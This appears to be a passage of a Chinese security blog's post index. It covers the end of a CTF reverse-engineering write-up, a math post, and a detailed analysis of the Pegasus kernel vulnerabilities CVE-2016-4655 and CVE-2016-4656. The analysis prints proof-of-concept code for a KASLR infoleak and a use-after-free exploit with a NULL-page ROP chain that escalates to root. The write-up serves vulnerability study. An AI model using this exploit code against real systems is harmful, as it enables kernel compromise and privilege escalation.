buf[COUNT] = {0}; assert(argc == 2); int fd = open(argv[1],O_RDWR);//打开文件 assert(fd&gt;0); assert(lseek(fd,0,SEEK_SET)!=-1);// 读取elf头 assert(read(fd,&amp;ehdr,sizeof(ehdr)) == sizeof(ehdr)); ehdr.e_entry = ENTRY;//修改入口地址 assert(lseek(fd,0,SEEK_SET)!=-1);//回写elf头 assert(write(fd,&amp;ehdr,sizeof(ehdr)) == sizeof(ehdr)); //解密 assert(lseek(fd,FILE_OFF,SEEK_SET)!=-1);//读取被加密的代码 assert(read(fd,buf,COUNT) == COUNT); int i = 0; while(i&lt;COUNT){ buf[i] = (buf[i]^66)&lt;&lt;5 | (buf[i]^66)&gt;&gt;3; i++; } assert(lseek(fd,FILE_OFF,SEEK_SET)!=-1);//写入正确代码 assert(write(fd,buf,COUNT) == COUNT); 0x03 分析算法计算flag#!/usr/bin/python # -*- coding: UTF-8 -*- from __future__ import print_function import sys def getflag(): print(&quot;[i]start to encrypt key&quot;) key = [0x73,0x8d,0xf2,0x4c,0xc7,0xd4,0x7b,0xf7,0x18,0x32,0x71,0x0d,0xcf,0xdc,0x67,0x4f,0x7f,0x0b,0x6d] encryptKey = [] print(&quot;encryptKey=[&quot;, end=&quot;&quot;) for idx in range(len(key)): encryptKey.append(key[idx] ^ 0x20) print(&quot;%x &quot; % encryptKey[idx], end=&quot;&quot;) print(&quot;]&quot;) flag = [] print(&quot;[i]find the flag&quot;) for i in range(len(encryptKey)): count = 0x00 while(count &lt;= 0x7f): one = count &gt;&gt; (((0 &gt;&gt; 0x1d) + i) &amp; 0x7 - (0 &gt;&gt; 0x1d)) two = count &lt;&lt; (0x8 - (((0 &gt;&gt; 0x1d) + i) &amp; 0x7 - (0 &gt;&gt; 0x1d))) if((((one | two) ^ i) &amp; 0xff) == encryptKey[i]): flag.append(count) break count = count + 1 print(&quot;flag = &quot;,end=&quot;&quot;) for i in range(len(flag)): print(&quot;%c&quot; % flag[i], end=&quot;&quot;) if __name__ == &#39;__main__&#39;: key = getflag() 最后运行程序得到flag [i]start to encrypt key encryptKey=[53 ad d2 6c e7 f4 5b d7 38 12 51 2d ef fc 47 6f 5f 2b 4d ] [i]find the flag flag = SYC{&gt;&gt;Wh06m1&gt;&gt;R0Ot} 测试：","tags":[{"name":"CTF","slug":"CTF","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/CTF/"},{"name":"writeup","slug":"writeup","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/writeup/"}]},{"title":"一道高中数学题的思考？","date":"2017-05-04T12:37:59.000Z","path":"2017/05/04/math/math/","text":"0x00 写在前面 突然在邮件中收到Quora中这样一个问题”What does X equal in $\\sqrt{x+15} + \\sqrt{x} = 15$? “ 凭着曾经对数学的热爱，我点了进去。顺便学习了点知识。 0x01 你会怎么解决？不得不承认，这种题型在初高中时候还是蛮常见的，在我的脑海里，也别无他法，一步一步去根号解方程吧。但都知道，同时平方带来就是可能会升高次数，有时候拿到答案还是挺繁琐的，至少计算上来说是这样的。 0x02 方法1 平方法通常解决这个问题的方法是将方程的两边平方并简化，并保持平方，直到方程中没有平方根 $\\sqrt{x+15} + \\sqrt{x} = 15$ $(\\sqrt{x+15} + \\sqrt{x})^2 = 15^2$ $x+15 + 2\\sqrt{(x+15)x} + x = 225$ $2\\sqrt{(x+15)x} = 210 - 2x$ $\\sqrt{(x+15)x} = 105 - x$ $(\\sqrt{(x+15)x})^2 = (105 - x)^2$ $x^2 + 15x = 11025 - 210x +x^2$ $225x = 11025$ $ x = 49$思维过程很清楚，但明显计算上有点繁琐。 0x03 方法2 拼凑法不一定可靠，但一定最快。大多情况下，都是开方后是整数。所以每个完全平方数的序列（$1^22^23^3…6^27^28^2… =&gt; 1 4 9 16 25 36 49 64 …$） 哪两个数相差15呢？很明显64 - 49 = 15，也许你觉得这很不靠谱，其实至少对于开方是整数的结果来说是很快的，觉得慢主要是你还不熟练。因为并不是一个一个的去试验，因为相邻之差是递增且快。类似二叉树来查找会很快得出结果。 $\\sqrt{49 + 15} + \\sqrt{49} = 15$ $7 + 8 = 15$最快，但不一定可靠。 0x04 方法3 平方差法暂且称作平方差法吧，这个方法是我最推荐的，既快又准。原式：$\\sqrt{x+15} + \\sqrt{x} = 15$ (1) 设 $\\sqrt{x+15} - \\sqrt{x} = k$ 又 $(\\sqrt{x+15} - \\sqrt{x})(\\sqrt{x+15} + \\sqrt{x})= 15k$ 解得： $k = 1$ 所以 $\\sqrt{x+15} - \\sqrt{x} = 1$ （2） 然后（1）+ (2): $2\\sqrt{x+15} = 16$ 解得: $x = 49$ 多么棒的一个方法 I love it！ 0x05 我与数学从小数学就比语文好的我，数学确实给了我很多自信，想破头皮的去思考一个一个的题。一如既往的热爱，以致于高考只填了一个专业–数学。由于种种原因，没能选上，去来到了计算机相关的专业。计算机科学同样是一个迷人的世界，那种理解本质，控制计算机的运行是让人着迷的。在反馈上来说，计算机比做数学得到的反馈更真实，快速。做数学题的时候总是找不到方向，得到的反馈少且慢，容易让人沮丧，想必这也是大多人讨厌数学的原因之一吧。虽然现在更热爱计算机，但心底里仍然有一个数学的种子。以至于很多时候看到感兴趣的题也会拿上纸笔算一算，知乎上也关注了相关话题，还有一个自己特别骄傲的回答，关于高中数列的，具体情况移步高考数学数列放缩总结技巧有哪些？相信不管是现在还是将来，数学都是我最深处的支持。","tags":[{"name":"math","slug":"math","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/math/"}]},{"title":"Pegasus内核漏洞及PoC分析","date":"2017-05-01T06:52:45.000Z","path":"2017/05/01/Pegasus内核漏洞及PoC分析/Pegasus内核漏洞及PoC分析/","text":"0x00 写在前面 不知道为什么，刚开始就有很多话想说。因为看似是本文开始，实际却是连续几天几夜的分析的结束。本文将详细介绍iOS三叉戟漏洞，其影响涉及OS X 10.11.6和 iOS 9.3.4。这里为了方便以及简单，环境为OS X 关注iOS安全的技术人员都或多或少的了解这个漏洞，这里就不多说，可以参考下面的链接或者自行Google 1.iOS“远程越狱”间谍软件Pegasus技术分析 2.iOS三叉戟漏洞补丁分析、利用代码 公布（POC 3.Pegasus – 针对iOS设备的APT攻击分析 0x01 目录 OSUnserializeBinary概述 漏洞分析-CVE-2016-4655，CVE-2016-4656 漏洞利用-PoC分析 总结 0x02 OSUnserializeBinary概述 序列化与反序列化在软件开发的过程中，两个模块通信时就需要序列化与发序列化，常见的xml-&gt;JSON，对应的反序列化JOSN-&gt;xml。简单来说就是数据格式上的一种相互转化。在XNU内核也有一个实现，OSUnserializeXML(将xml格式转化为内核数据对象)和OSUnserializeBinary(将二进制格式转化为内核数据对象) OSUnserializeBinary的二进制格式OSUnserializeBinary这个函数将连续的二进制流分成uint32_t32字节来处理。所以32位的整数就有特殊含义来表示一些数据结构。如下 #define kOSSerializeBinarySignature &quot;\\323\\0\\0&quot; /* 0x000000d3 */ enum { kOSSerializeDictionary = 0x01000000U, kOSSerializeArray = 0x02000000U, kOSSerializeSet = 0x03000000U, kOSSerializeNumber = 0x04000000U, kOSSerializeSymbol = 0x08000000U, kOSSerializeString = 0x09000000U, kOSSerializeData = 0x0a000000U, kOSSerializeBoolean = 0x0b000000U, kOSSerializeObject = 0x0c000000U, kOSSerializeTypeMask = 0x7F000000U, kOSSerializeDataMask = 0x00FFFFFFU, kOSSerializeEndCollection = 0x80000000U, }; 这里的0x000000d3代表了这个数据流的签名即开始的32位必须为该整数值，下面有一个字典，数组，集合等集合类数据结构，也有数字，字符串等基本数据结构表示。kOSSerializeTypeMask和kOSSerializeDataMask分别为类型和数据大小掩码。kOSSerializeEndCollection代表当前集合(dic，array或set)是否结束。可以看到，31位表示当前集合是否结束，30-24位表示当前数据类型，23-0表示元素的长度。 当前集合是否结束 当前数据类型 当前元素长度 0 0000000 000000000000000000000000 例如下面的二进制数据 0x000000d3 0x81000000 0x09000004 0x41414141 0x8b000001 则对应： &lt;dict&gt; &lt;string&gt;AAAA&lt;/string&gt; //键key &lt;boolean&gt;1&lt;/boolean&gt; //值value &lt;/dict&gt; 这样的数据结构。对应过程也很简单，0x000000d3标志为合法的签名，0x81000000为dic类型且为最后一个元素，0x09000004为4字节大小的字符串，0x8b000001为bool型，所以只需用最后一位代表true或false OSUnserializeBinary()分析完整源代码见文末，下面将对其中几个重要的地方分别做分析说明 while (ok) { bufferPos += sizeof(*next); if (!(ok = (bufferPos &lt;= bufferSize))) break; key = *next++; len = (key &amp; kOSSerializeDataMask); wordLen = (len + 3) &gt;&gt; 2; end = (0 != (kOSSerializeEndCollecton &amp; key)); newCollect = isRef = false; o = 0; newDict = 0; newArray = 0; newSet = 0; switch (kOSSerializeTypeMask &amp; key) { case kOSSerializeDictionary: ... case kOSSerializeArray: ... case kOSSerializeSet: ... case kOSSerializeObject: ... case kOSSerializeNumber: ... case kOSSerializeSymbol: ... case kOSSerializeString: ... case kOSSerializeData: ... case kOSSerializeBoolean: ... default: break; } ... 进行一些初始化和检查后就进入while(ok)循环，并且是以32位的整数位单位遍历循环，读取当前的整数key，确定其长度len，当前集合31位是否设置end。并通过类型掩码kOSSerializeTypeMask确定其key的类型从而进入不同的case。例如我们看kOSSerializeDictionary例子 case kOSSerializeDictionary: o = newDict = OSDictionary::withCapacity(len); newCollect = (len != 0); break; o为指向当前反序列化对象的指针，在每种case中被指定 case kOSSerializeData: bufferPos += (wordLen * sizeof(uint32_t)); if (bufferPos &gt; bufferSize) break; o = OSData::withBytes(next, len); next += wordLen; break; 这里当遇到一个为kOSSerializeData类型时，根据其len找到其数据并将其存储在OSData数据结构中，并移动next。其他的case都做类似对应的处理。跳出switch if (!(ok = (o != 0))) break; 因为每一次循环都会进入case并将o设置为对应对象才合法，当等于0时就说明不合法，则退出。 if (!isRef) { setAtIndex(objs, objsIdx, o); if (!ok) break; objsIdx++; } 这里很重要将与后面的漏洞相关，首先判断isRef是否被设置。 case kOSSerializeObject: if (len &gt;= objsIdx) break; o = objsArray[len]; o-&gt;retain(); isRef = true; break; isRef只有当当前的类型为kOSSerializeObject即引用类型是才被设为true，这里引用的意思则表示当前指向dic中其他数据，其值为对应下标。回到前面那里，下面重点关注setAtIndex这个宏定义 #define setAtIndex(v, idx, o) \\ if (idx &gt;= v##Capacity) \\ { \\ uint32_t ncap = v##Capacity + 64; \\ typeof(v##Array) nbuf = (typeof(v##Array)) kalloc_container(ncap * sizeof(o)); \\ if (!nbuf) ok = false; \\ if (v##Array) \\ { \\ bcopy(v##Array, nbuf, v##Capacity * sizeof(o)); \\ kfree(v##Array, v##Capacity * sizeof(o)); \\ } \\ v##Array = nbuf; \\ v##Capacity = ncap; \\ } \\ if (ok) v##Array[idx] = o; 看着很复杂，但简单来说就是如果数组大小不够的话就增加大小，然后就将其之前的o指向的对象放到objs数组中对应的位置。 if (dict) { if (sym) { if (o != dict) ok = dict-&gt;setObject(sym, o, true); o-&gt;release(); sym-&gt;release(); sym = 0; } else { sym = OSDynamicCast(OSSymbol, o); if (!sym &amp;&amp; (str = OSDynamicCast(OSString, o))) { sym = (OSSymbol *) OSSymbol::withString(str); o-&gt;release(); o = 0; } ok = (sym != 0); } } else if (array) { ok = array-&gt;setObject(o); o-&gt;release(); } else if (set) { ok = set-&gt;setObject(o); o-&gt;release(); } else { assert(!parent); result = o; } 对解析出来的当前的集合做对应处理，比如这里的如果dic为真，因为dic字典数据结构需要key-&gt;value键值对的形式，所以先判断sym，若没设置，则代表当前o对象为key，则将其转化为OSSymbol类型，设置sym为true并将ofree，那么下一次的o代表的对象一定是值，然后就将sym和o以键值对的形式存储在dic字典中，如此交替。后面的代码对漏洞来说不是很重要了 if (newCollect) { if (!end) { stackIdx++; setAtIndex(stack, stackIdx, parent); if (!ok) break; } DEBG(&quot;++stack[%d] %p\\n&quot;, stackIdx, parent); parent = o; dict = newDict; array = newArray; set = newSet; end = false; } if (end) { if (!stackIdx) break; parent = stackArray[stackIdx]; DEBG(&quot;--stack[%d] %p\\n&quot;, stackIdx, parent); stackIdx--; set = 0; dict = 0; array = 0; if (!(dict = OSDynamicCast(OSDictionary, parent))) { if (!(array = OSDynamicCast(OSArray, parent))) ok = (0 != (set = OSDynamicCast(OSSet, parent))); } } 简单来说就是判断是否有新集合，如有的话，就将其压入栈中，那么后面的元素都放到新集合中，当end时就将整个新集合放入之前的dic。 0x03 漏洞分析-CVE-2016-4655，CVE-2016-4656这里将介绍两个漏洞：1，CVE-2016-4655-infoleak漏洞；2，CVE-2016-4656-UAF漏洞 CVE-2016-4655-infoleak和我们之前分析的linux中printf格式漏洞类似，利用这个漏洞我们可以获取到内核栈中的地址信息，这些信息对于绕过KASLR内核地址空间随机偏移非常有用，因为系统每次启动时内核地址都偏移了一随机数，一旦确定了KSALR，我们就可以进一步做ROP等攻击。 下面看漏洞点，回顾之前kOSSerializeNumber这个case内容 case kOSSerializeNumber: bufferPos += sizeof(long long); if (bufferPos &gt; bufferSize) break; value = next[1]; value &lt;&lt;= 32; value |= next[0]; o = OSNumber::withNumber(value, len); next += 2; break; 这里存在什么问题呢？这里没有检查OSNumber的长度，也就是说我们可以创建一个任意长度的OSNumber，进而在内核读取的时候越界，然后泄漏内核地址信息。 CVE-2016-4656-UAF漏洞UAF漏洞即当一个已经free的内存在某处被引用以后发生，可以想象，一个被free的对象其内容是不确定的，对其引用则会造成不可预测的后果。因为内存可能随时被其他对象占用，而在这里，如果我们时机足够恰当，就可以精心构造一个对象占用free的内存，当前引用时，就会按照我们的计划执行。来看下漏洞点，下面的代码是序列化字典dic将OSString这个键转化为OSSymbol，见下 if (dict) { if (sym) { ... } else { sym = OSDynamicCast(OSSymbol, o); if (!sym &amp;&amp; (str = OSDynamicCast(OSString, o))) { sym = (OSSymbol *) OSSymbol::withString(str); o-&gt;release(); o = 0; } ok = (sym != 0); } } 这里o-&gt;release()有什么问题呢?还记得objsArray吧，用来存储所有的对象，但是用setAtIndex这个宏来将所有的对象o存在里面，而宏不实现任何类型的引用计数机制，所以存储在其中的引用不会被删除。这在我们不引用其他对象的时候是没有什么问题的，但如果是一个引用对象的话，看下面kOSSerializeObject中的switchcase。 case kOSSerializeObject: if (len &gt;= objsIdx) break; o = objsArray[len]; o-&gt;retain(); isRef = true; break; 此时之前存储在之前的objsArray的OSString已经free，而 o = objsArray[len]; o-&gt;retain();由对其进行了retain引用，好的一个完美的UAF漏洞。所以我们可以构造一个字典dic，其中OSString包含一些配对的值，然后序列化一个kOSSerializeObject引用对象，OSString将调用retain，但却是一个被释放的对象。 0x04 漏洞利用-PoC分析同样分为两个漏洞利用：1，CVE-2016-4655-infoleak漏洞利用；2，CVE-2016-4656-UAF漏洞利用 CVE-2016-4655-infoleak漏洞利用infoleak漏洞利用步骤： 构造一个包含过长的OSNumberdic字典 用这个序列化字典去设置userclient对象的属性 读回设置的OSNumber属性，造成infoleak 利用读取回来的内核地址信息计算KASLR 完整的代码。 uint64_t kslide_infoleak(void) { kern_return_t kr = 0, err = 0; mach_port_t res = MACH_PORT_NULL, master = MACH_PORT_NULL; io_service_t serv = 0; io_connect_t conn = 0; io_iterator_t iter = 0; uint64_t kslide = 0; void *dict = calloc(1, 512); uint32_t idx = 0; // index into our data #define WRITE_IN(dict, data) do { *(uint32_t *)(dict + idx) = (data); idx += 4; } while (0) WRITE_IN(dict, (0x000000d3)); // signature, always at the beginning WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 2)); // dictionary with two entries WRITE_IN(dict, (kOSSerializeSymbol | 4)); // key with symbol, 3 chars + NUL byte WRITE_IN(dict, (0x00414141)); // &#39;AAA&#39; key + NUL byte in little-endian WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeNumber | 0x200)); // value with big-size number WRITE_IN(dict, (0x41414141)); WRITE_IN(dict, (0x41414141)); // at least 8 bytes for our big numbe host_get_io_master(mach_host_self(), &amp;master); // get iokit master port kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res); if (kr == KERN_SUCCESS) { printf(&quot;(+) Dictionary is valid! Spawning user client...\\n&quot;); } else return -1; serv = IOServiceGetMatchingService(master, IOServiceMatching(&quot;IOHDIXController&quot;)); kr = io_service_open_extended(serv, mach_task_self(), 0, NDR_record, (io_buf_ptr_t)dict, idx, &amp;err, &amp;conn); if (kr == KERN_SUCCESS) { printf(&quot;(+) UC successfully spawned! Leaking bytes...\\n&quot;); } else return -1; IORegistryEntryCreateIterator(serv, &quot;IOService&quot;, kIORegistryIterateRecursively, &amp;iter); io_object_t object = IOIteratorNext(iter); char buf[0x200] = {0}; mach_msg_type_number_t bufCnt = 0x200; kr = io_registry_entry_get_property_bytes(object, &quot;AAA&quot;, (char *)&amp;buf, &amp;bufCnt); if (kr == KERN_SUCCESS) { printf(&quot;(+) Done! Calculating KASLR slide...\\n&quot;); } else return -1; #if 0 for (uint32_t k = 0; k &lt; 128; k += 8) { printf(&quot;%#llx\\n&quot;, *(uint64_t *)(buf + k)); } #endif uint64_t hardcoded_ret_addr = 0xffffff80003934bf; kslide = (*(uint64_t *)(buf + (7 * sizeof(uint64_t)))) - hardcoded_ret_addr; printf(&quot;(i) KASLR slide is %#016llx\\n&quot;, kslide); return kslide; } 构造字典看下面这段代码 void *dict = calloc(1, 512); uint32_t idx = 0; // index into our data #define WRITE_IN(dict, data) do { *(uint32_t *)(dict + idx) = (data); idx += 4; } while (0) 这里的WRITE_IN这个宏只是为了方便我们将数据填入内存之中 xml的字典格式 &lt;dict&gt; &lt;symbol&gt;AAA&lt;/symbol&gt; &lt;number size=0x200&gt;0x4141414141414141&lt;/number&gt; &lt;/dict&gt; 对应的代码 WRITE_IN(dict, (0x000000d3)); // 头部签名 WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 2)); // 包含两个元素的字典 WRITE_IN(dict, (kOSSerializeSymbol | 4)); // 长度为3的symbol WRITE_IN(dict, (0x00414141)); // &#39;AAA&#39; key键 WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeNumber | 0x200)); //0x200大小的number WRITE_IN(dict, (0x41414141)); WRITE_IN(dict, (0x41414141)); //实际8字节的number 利用io_service_get_matching_services_bin测试我们的dic是否有效 host_get_io_master(mach_host_self(), &amp;master); // get iokit master port kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res); if (kr == KERN_SUCCESS) { printf(&quot;(+) Dictionary is valid! Spawning user client...\\n&quot;); } else return -1; 若kr == KERN_SUCCESS则我们的dic则为有效 生成UserClient设定属性我们需要一个UserClient用来和内核通信，所以使用io_service_open_extended来产生一个相关服务的UserClient，这里的服务并不重要 serv = IOServiceGetMatchingService(master, IOServiceMatching(&quot;IOHDIXController&quot;)); kr = io_service_open_extended(serv, mach_task_self(), 0, NDR_record, (io_buf_ptr_t)dict, idx, &amp;err, &amp;conn); if (kr == KERN_SUCCESS) { printf(&quot;(+) UC successfully spawned! Leaking bytes...\\n&quot;); } else return -1; 首先我们通过IOServiceGetMatchingService去从IORegistry里匹配一个特定服务，然后通过io_service_open_extended让可以设置其属性并打开一个服务即隐式产生UserClient接下来就需要读取属性，我们通过得到一个访问的句柄，所以迭代IORegistry找到刚刚创建的UserClient。 IORegistryEntryCreateIterator(serv, &quot;IOService&quot;, kIORegistryIterateRecursively, &amp;iter); io_object_t object = IOIteratorNext(iter); 先通过serv端口创建io_iterator_t，我们的UserClient在serv创建之后，所以拿到iter后迭代一次即为我们的UserClient，现在就可以读取其属性并触发info-leak。 读取属性，触发info-leakchar buf[0x200] = {0}; mach_msg_type_number_t bufCnt = 0x200; kr = io_registry_entry_get_property_bytes(object, &quot;AAA&quot;, (char *)&amp;buf, &amp;bufCnt); if (kr == KERN_SUCCESS) { printf(&quot;(+) Done! Calculating KASLR slide...\\n&quot;); } else return -1; 通过io_registry_entry_get_property_bytes我们可以获取到原始字节，存在buf中，我们打印其值 for (uint32_t k = 0; k &lt; 128; k += 8) { printf(&quot;%#llx\\n&quot;, *(uint64_t *)(buf + k)); } 对应输出： 0x4141414141414141 // 有效的number 0xffffff8033c66284 // 0xffffff8035b5d800 // 0x4 // 其他数据或返回地址 0xffffff803506d5a0 // 0xffffff8033c662b4 // 0xffffff818d2b3e30 // 0xffffff80037934bf // 函数返回地址 ... 我们需要清楚函数的调用过程，那么久知道栈中返回地址所属函数这里实际读取的代码位于is_io_registry_entry_get_property_bytes函数，即io_registry_entry_get_property_bytes调用了 is_io_registry_entry_get_property_bytes。 is_io_registry_entry_get_property_bytes源代码 /* Routine io_registry_entry_get_property */ kern_return_t is_io_registry_entry_get_property_bytes( io_object_t registry_entry, io_name_t property_name, io_struct_inband_t buf, mach_msg_type_number_t *dataCnt ) { OSObject * obj; OSData * data; OSString * str; OSBoolean * boo; OSNumber * off; UInt64 offsetBytes; unsigned int len = 0; const void * bytes = 0; IOReturn ret = kIOReturnSuccess; CHECK( IORegistryEntry, registry_entry, entry ); #if CONFIG_MACF if (0 != mac_iokit_check_get_property(kauth_cred_get(), entry, property_name)) return kIOReturnNotPermitted; #endif obj = entry-&gt;copyProperty(property_name); if( !obj) return( kIOReturnNoResources ); // One day OSData will be a common container base class // until then... if( (data = OSDynamicCast( OSData, obj ))) { len = data-&gt;getLength(); bytes = data-&gt;getBytesNoCopy(); } else if( (str = OSDynamicCast( OSString, obj ))) { len = str-&gt;getLength() + 1; bytes = str-&gt;getCStringNoCopy(); } else if( (boo = OSDynamicCast( OSBoolean, obj ))) { len = boo-&gt;isTrue() ? sizeof(&quot;Yes&quot;) : sizeof(&quot;No&quot;); bytes = boo-&gt;isTrue() ? &quot;Yes&quot; : &quot;No&quot;; } else if( (off = OSDynamicCast( OSNumber, obj ))) { /* j: reading an OSNumber */ offsetBytes = off-&gt;unsigned64BitValue(); len = off-&gt;numberOfBytes(); bytes = &amp;offsetBytes; #ifdef __BIG_ENDIAN__ bytes = (const void *) (((UInt32) bytes) + (sizeof( UInt64) - len)); #endif } else ret = kIOReturnBadArgument; if( bytes) { if( *dataCnt &lt; len) ret = kIOReturnIPCError; else { *dataCnt = len; bcopy( bytes, buf, len ); } } obj-&gt;release(); return( ret ); } 下面代码表示正在读取OSNumber， ... else if( (off = OSDynamicCast( OSNumber, obj ))) { offsetBytes = off-&gt;unsigned64BitValue(); /* j: the offsetBytes variable is allocated on the stack */ len = off-&gt;numberOfBytes(); /* j: this reads out our malformed length, 0x200 */ bytes = &amp;offsetBytes; /* j: bytes* ptr points to a stack variable */ ... } ... 然后 if( bytes) { if( *dataCnt &lt; len) ret = kIOReturnIPCError; else { *dataCnt = len; bcopy( bytes, buf, len ); /* j: this leaks data from the stack */ } } 执行bcopy时，从bytes里读取了错误的长度，指向堆栈变量，泄漏函数返回地址，我们只需要找到一个地址减去静态地址，那么就能计算出内核偏移值 计算内核偏移将/System/Library/Kernels/kernel拖入hopper，搜索is_io_registry_entry_get_property_bytes，如下图 然后通过Xref找到调用的下一条地址即返回地址，最后将之前偏移后的地址-静态地址就等到了内核偏移值 0xffffff80037934bf - 0xffffff80003934bf = 0x3400000 也就是下面这段代码所示： uint64_t hardcoded_ret_addr = 0xffffff80003934bf; kslide = (*(uint64_t *)(buf + (7 * sizeof(uint64_t)))) - hardcoded_ret_addr; printf(&quot;(i) KASLR slide is %#016llx\\n&quot;, kslide); 现在获取到了内核偏移值就可以利用UAF漏洞执行ROP链然后提权root。here we go！ CVE-2016-4656-UAF漏洞利用XNU的堆分配器被称为zalloc，这次我可以偷下懒了，与我之前分析得linux堆分配器相比虽然细节上可能有所不同，但基本原理都大同小异，简单的说来就是提供了不同的分配表，free后的元素会放入对应大小的链表之中，且位于最后，即如果时间合适，我们下次分配同样大小的内存就会返回刚free的内存。还不清楚的可以移步深入理解Linux堆分配器-DLMalloc这篇分析。那么下面要做的就是如何构造下一个分配的对象，这里我们用OSData因为可以使用原生的二进制数据。回忆之前的UAF漏洞，当下一次o-&gt;retain引用就会触发，这里涉及到一个C++虚拟函数表的问题，当然我之前也分析过，不清楚的可以移步详解virtual table简单说来一个对象的地址实际指向的是vtable，通过vtable就能找到对应的函数。所以我们可以构造假的vtable地址达到控制rip到自定义的地址。当然这里还有另一个技术-map NULL。为了能够有效的利用和控制，因为其他地址可能被修改，我们如果能在NULL段进行shellcode以及ROP链的部署那么就能稳定的利用。下面看我们的步骤： 制作一个二进制字典，释放OSString并重新分配OSData。 Map NULL 放置stack pivot在偏移0x20到NULL页面 将一个小的传输链0x0放置在NULL页面中（这将传递执行到主链） 触发漏洞 提升权限，生成shell 下面看完整的Poc代码： void use_after_free(void) { kern_return_t kr = 0; mach_port_t res = MACH_PORT_NULL, master = MACH_PORT_NULL; /* craft the dictionary */ printf(&quot;(i) Crafting dictionary...\\n&quot;); void *dict = calloc(1, 512); uint32_t idx = 0; // index into our data #define WRITE_IN(dict, data) do { *(uint32_t *)(dict + idx) = (data); idx += 4; } while (0) WRITE_IN(dict, (0x000000d3)); // signature, always at the beginning WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 6)); // dict with 6 entries WRITE_IN(dict, (kOSSerializeString | 4)); // string &#39;AAA&#39;, will get freed WRITE_IN(dict, (0x00414141)); WRITE_IN(dict, (kOSSerializeBoolean | 1)); // bool, true WRITE_IN(dict, (kOSSerializeSymbol | 4)); // symbol &#39;BBB&#39; WRITE_IN(dict, (0x00424242)); WRITE_IN(dict, (kOSSerializeData | 32)); // data (0x00 * 32) WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (kOSSerializeSymbol | 4)); // symbol &#39;CCC&#39; WRITE_IN(dict, (0x00434343)); WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeObject | 1)); // ref to object 1 (OSString) /* map the NULL page */ mach_vm_address_t null_map = 0; vm_deallocate(mach_task_self(), 0x0, PAGE_SIZE); kr = mach_vm_allocate(mach_task_self(), &amp;null_map, PAGE_SIZE, 0); if (kr != KERN_SUCCESS) return; macho_map_t *map = map_file_with_path(KERNEL_PATH_ON_DISK); printf(&quot;(i) Leaking kslide...\\n&quot;); SET_KERNEL_SLIDE(kslide_infoleak()); // set global kernel slide /* set the stack pivot at 0x20 */ *(volatile uint64_t *)(0x20) = (volatile uint64_t)ROP_XCHG_ESP_EAX(map); // stack pivot /* build ROP chain */ printf(&quot;(i) Building ROP chain...\\n&quot;); rop_chain_t *chain = calloc(1, sizeof(rop_chain_t)); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_current_proc&quot;)); PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_proc_ucred&quot;)); PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_posix_cred_get&quot;)); PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain); PUSH_GADGET(chain) = ROP_ARG2(chain, map, (sizeof(int) * 3)); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_bzero&quot;)); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_thread_exception_return&quot;)); /* chain transfer, will redirect execution flow from 0x0 to our main chain above */ uint64_t *transfer = (uint64_t *)0x0; transfer[0] = ROP_POP_RSP(map); transfer[1] = (uint64_t)chain-&gt;chain; /* trigger */ printf(&quot;(+) All done! Triggering the bug!\\n&quot;); host_get_io_master(mach_host_self(), &amp;master); // get iokit master port kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res); if (kr != KERN_SUCCESS) return; } 这里有很多的宏定义函数，先不用管这些，整个PoC代码在文章最后将会在我的GitHub上找到下面一步一步分析 构造字典将如下构造 &lt;dict&gt; &lt;string&gt;AAA&lt;/string&gt; &lt;boolean&gt;true&lt;/boolean&gt; &lt;symbol&gt;BBB&lt;/symbol&gt; &lt;data&gt; 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 &lt;/data&gt; &lt;symbol&gt;CCC&lt;/symbol&gt; &lt;reference&gt;1&lt;/reference&gt; &lt;!--引用第一个string元素--&gt; &lt;/dict&gt; 当执行retain时就会以0x20的偏移量地址读取，也就是rip其值将为0x20可能你会疑惑，0x20地址处不是应该处于__PAGEZERO段吗？是这样的，所以下面介绍Map NULL技术 Map NULL苹果并没有对32位强制限制不能map，具体我在Google上搜到了这些答案：意思就是我们可以将__PAGEZERO段重新映射为可用段，就可以将ROP链布置上去。 mach_vm_address_t null_map = 0; vm_deallocate(mach_task_self(), 0x0, PAGE_SIZE); kr = mach_vm_allocate(mach_task_self(), &amp;null_map, PAGE_SIZE, 0); if (kr != KERN_SUCCESS) return; 这段代码即禁用__PAGEZERO段和Map NULL，要达到目的，我们需要将二进制文件编译为32位，并包含pagezero_size,0标志 Pivoting stack和ROP链下面的这部分内容和我之前分析的linux ROP技术类似，利用ret指令将栈中的地址pop到rip达到执行任意代码的目的。若不清楚，移步Protostar-栈溢出学习-覆盖栈函数指针和ret指令控制eip首先将rip转移到0x20处 *(volatile uint64_t *)(0x20) = (volatile uint64_t)ROP_XCHG_ESP_EAX(map); // stack pivot 然后通过交换rsp和eax值，将rip转移到0x00位置处，这一步的目的即在__PAGEZERO段上控制栈结构，因为每是将rsp的值pop到ret中，这也就是stack pivot技术。 uint64_t *transfer = (uint64_t *)0x0; transfer[0] = ROP_POP_RSP(map); transfer[1] = (uint64_t)chain-&gt;chain; 